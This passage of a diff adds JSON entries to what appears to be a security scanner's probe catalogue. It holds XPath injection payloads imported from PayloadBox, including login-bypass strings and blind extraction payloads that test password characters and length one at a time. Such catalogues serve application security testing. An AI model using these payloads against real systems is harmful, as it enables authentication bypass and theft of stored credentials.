+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0004",
+    "name": "Xpath Injection #4",
+    "template": "\"\"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \"\"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0005",
+    "name": "Xpath Injection #5",
+    "template": "\" or \"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or \"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0006",
+    "name": "Xpath Injection #6",
+    "template": "' or 1=1 or '",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 or '",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0007",
+    "name": "Xpath Injection #7",
+    "template": "\" or 1=1 or \"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or 1=1 or \"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0008",
+    "name": "Xpath Injection #8",
+    "template": "' or 'a'='a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 'a'='a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0009",
+    "name": "Xpath Injection #9",
+    "template": "\" or \"a\"=\"a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or \"a\"=\"a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0010",
+    "name": "Xpath Injection #10",
+    "template": "x\" or 1=1 or \"x\"=\"y",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: x\" or 1=1 or \"x\"=\"y",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0011",
+    "name": "Xpath Injection #11",
+    "template": "admin' or 1=1 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: admin' or 1=1 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0012",
+    "name": "Xpath Injection #12",
+    "template": "admin\" or \"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: admin\" or \"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0013",
+    "name": "Xpath Injection #13",
+    "template": "admin\" or 1=1 or \"\"=\"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: admin\" or 1=1 or \"\"=\"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0014",
+    "name": "Xpath Injection #14",
+    "template": "' or '1'='1' --",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or '1'='1' --",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0015",
+    "name": "Xpath Injection #15",
+    "template": "\" or \"1\"=\"1\" --",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or \"1\"=\"1\" --",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0016",
+    "name": "Xpath Injection #16",
+    "template": "\") or (\"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \") or (\"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0017",
+    "name": "Xpath Injection #17",
+    "template": "'] or ['1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '] or ['1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0018",
+    "name": "Xpath Injection #18",
+    "template": "\"] or [\"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \"] or [\"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0019",
+    "name": "Xpath Injection #19",
+    "template": "' and '1'='1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and '1'='1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0020",
+    "name": "Xpath Injection #20",
+    "template": "' and '1'='2",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and '1'='2",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0021",
+    "name": "Xpath Injection #21",
+    "template": "\" and \"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" and \"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0022",
+    "name": "Xpath Injection #22",
+    "template": "\" and \"1\"=\"2",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" and \"1\"=\"2",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0023",
+    "name": "Xpath Injection #23",
+    "template": "' and 1=1 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and 1=1 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0024",
+    "name": "Xpath Injection #24",
+    "template": "' and 1=2 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and 1=2 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0025",
+    "name": "Xpath Injection #25",
+    "template": "\" and 1=1 and \"\"=\"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" and 1=1 and \"\"=\"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0026",
+    "name": "Xpath Injection #26",
+    "template": "\" and 1=2 and \"\"=\"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" and 1=2 and \"\"=\"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0027",
+    "name": "Xpath Injection #27",
+    "template": "' or 'x'='x",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 'x'='x",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0028",
+    "name": "Xpath Injection #28",
+    "template": "\" or \"\"=\"",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" or \"\"=\"",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0029",
+    "name": "Xpath Injection #29",
+    "template": "' or 1=1 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0030",
+    "name": "Xpath Injection #30",
+    "template": "'] | /*[1=1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: '] | /*[1=1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0031",
+    "name": "Xpath Injection #31",
+    "template": "\"] | /*[1=1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \"] | /*[1=1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0032",
+    "name": "Xpath Injection #32",
+    "template": "' and 'x'='x",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and 'x'='x",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0033",
+    "name": "Xpath Injection #33",
+    "template": "\" and \"x\"=\"x",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: \" and \"x\"=\"x",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0034",
+    "name": "Xpath Injection #34",
+    "template": "' and count(//*)>0 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and count(//*)>0 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0035",
+    "name": "Xpath Injection #35",
+    "template": "' and string-length(name(/*[1]))>0 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and string-length(name(/*[1]))>0 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0036",
+    "name": "Xpath Injection #36",
+    "template": "' or count(/*)>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(/*)>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0037",
+    "name": "Xpath Injection #37",
+    "template": "' or count(/child::node())>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(/child::node())>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0038",
+    "name": "Xpath Injection #38",
+    "template": "' or count(//*)>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(//*)>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0039",
+    "name": "Xpath Injection #39",
+    "template": "' or name(/*)='root' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or name(/*)='root' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0040",
+    "name": "Xpath Injection #40",
+    "template": "' or local-name(/*)='root' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or local-name(/*)='root' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0041",
+    "name": "Xpath Injection #41",
+    "template": "' or //user or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0042",
+    "name": "Xpath Injection #42",
+    "template": "' or //* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0043",
+    "name": "Xpath Injection #43",
+    "template": "' or substring(//user[1]/password,1,1)='a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring(//user[1]/password,1,1)='a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0044",
+    "name": "Xpath Injection #44",
+    "template": "' or string-length(//user[1]/password)>5 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or string-length(//user[1]/password)>5 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0045",
+    "name": "Xpath Injection #45",
+    "template": "' or count(//user)>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(//user)>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0046",
+    "name": "Xpath Injection #46",
+    "template": "' or name(/*)='users' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or name(/*)='users' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0047",
+    "name": "Xpath Injection #47",
+    "template": "' or starts-with(//user[1]/name,'admin') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or starts-with(//user[1]/name,'admin') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0048",
+    "name": "Xpath Injection #48",
+    "template": "' or contains(//user[1]/name,'admin') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or contains(//user[1]/name,'admin') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0049",
+    "name": "Xpath Injection #49",
+    "template": "' and substring(//user[1]/password,1,1)='a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and substring(//user[1]/password,1,1)='a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0050",
+    "name": "Xpath Injection #50",
+    "template": "' and substring(//user[1]/password,1,1)='b",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and substring(//user[1]/password,1,1)='b",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0051",
+    "name": "Xpath Injection #51",
+    "template": "' and substring(//user[1]/password,2,1)='a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and substring(//user[1]/password,2,1)='a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0052",
+    "name": "Xpath Injection #52",
+    "template": "' and substring(//user[position()=1]/password,1,1)='a",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and substring(//user[position()=1]/password,1,1)='a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0053",
+    "name": "Xpath Injection #53",
+    "template": "' or substring(string(//user[1]/password),1,1)='a' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring(string(//user[1]/password),1,1)='a' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0054",
+    "name": "Xpath Injection #54",
+    "template": "' and string-length(//user[1]/password)=1 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and string-length(//user[1]/password)=1 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0055",
+    "name": "Xpath Injection #55",
+    "template": "' and string-length(//user[1]/password)>5 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and string-length(//user[1]/password)>5 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0056",
+    "name": "Xpath Injection #56",
+    "template": "' and string-length(//user[1]/password)<20 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and string-length(//user[1]/password)<20 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0057",
+    "name": "Xpath Injection #57",
+    "template": "' or string-length(//user[1]/password)>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or string-length(//user[1]/password)>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0058",
+    "name": "Xpath Injection #58",
+    "template": "' and count(//user)=1 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and count(//user)=1 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0059",
+    "name": "Xpath Injection #59",
+    "template": "' and count(//user)>1 and ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' and count(//user)>1 and ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0060",
+    "name": "Xpath Injection #60",
+    "template": "' or count(//user[name='admin'])>0 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or count(//user[name='admin'])>0 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0061",
+    "name": "Xpath Injection #61",
+    "template": "' or name(/*[1])='root' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or name(/*[1])='root' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0062",
+    "name": "Xpath Injection #62",
+    "template": "' or local-name(/*[1])='users' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or local-name(/*[1])='users' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0063",
+    "name": "Xpath Injection #63",
+    "template": "' or name(/*[1]/*[1])='user' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or name(/*[1]/*[1])='user' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0064",
+    "name": "Xpath Injection #64",
+    "template": "' or local-name(//*[1])='username' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or local-name(//*[1])='username' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0065",
+    "name": "Xpath Injection #65",
+    "template": "' or @*[1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or @*[1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0066",
+    "name": "Xpath Injection #66",
+    "template": "' or //@id or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //@id or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0067",
+    "name": "Xpath Injection #67",
+    "template": "' or //@username or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //@username or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0068",
+    "name": "Xpath Injection #68",
+    "template": "' or //@password or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //@password or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0069",
+    "name": "Xpath Injection #69",
+    "template": "' or //user/@id or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/@id or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0070",
+    "name": "Xpath Injection #70",
+    "template": "' or name(//@*[1])='id' or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or name(//@*[1])='id' or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0071",
+    "name": "Xpath Injection #71",
+    "template": "' or //user/parent::* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/parent::* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0072",
+    "name": "Xpath Injection #72",
+    "template": "' or //password/parent::user or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //password/parent::user or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0073",
+    "name": "Xpath Injection #73",
+    "template": "' or //*/parent::node() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //*/parent::node() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0074",
+    "name": "Xpath Injection #74",
+    "template": "' or //user/following-sibling::* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/following-sibling::* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0075",
+    "name": "Xpath Injection #75",
+    "template": "' or //user/preceding-sibling::* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/preceding-sibling::* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0076",
+    "name": "Xpath Injection #76",
+    "template": "' or //username/following-sibling::password or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //username/following-sibling::password or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0077",
+    "name": "Xpath Injection #77",
+    "template": "' or //user/ancestor::* or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user/ancestor::* or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0078",
+    "name": "Xpath Injection #78",
+    "template": "' or //password/ancestor::user or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //password/ancestor::user or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0079",
+    "name": "Xpath Injection #79",
+    "template": "' or //*/ancestor::node() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //*/ancestor::node() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0080",
+    "name": "Xpath Injection #80",
+    "template": "' or //*/descendant::user or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //*/descendant::user or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0081",
+    "name": "Xpath Injection #81",
+    "template": "' or //root/descendant::password or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //root/descendant::password or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0082",
+    "name": "Xpath Injection #82",
+    "template": "' or /descendant::node() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or /descendant::node() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0083",
+    "name": "Xpath Injection #83",
+    "template": "' or //user[1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0084",
+    "name": "Xpath Injection #84",
+    "template": "' or //user[2] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[2] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0085",
+    "name": "Xpath Injection #85",
+    "template": "' or //user[position()=1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[position()=1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0086",
+    "name": "Xpath Injection #86",
+    "template": "' or //user[position()>0] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[position()>0] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0087",
+    "name": "Xpath Injection #87",
+    "template": "' or //user[last()] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[last()] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0088",
+    "name": "Xpath Injection #88",
+    "template": "' or //*[position()=1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //*[position()=1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0089",
+    "name": "Xpath Injection #89",
+    "template": "' or //user[id=1] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id=1] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0090",
+    "name": "Xpath Injection #90",
+    "template": "' or //user[id>0] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id>0] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
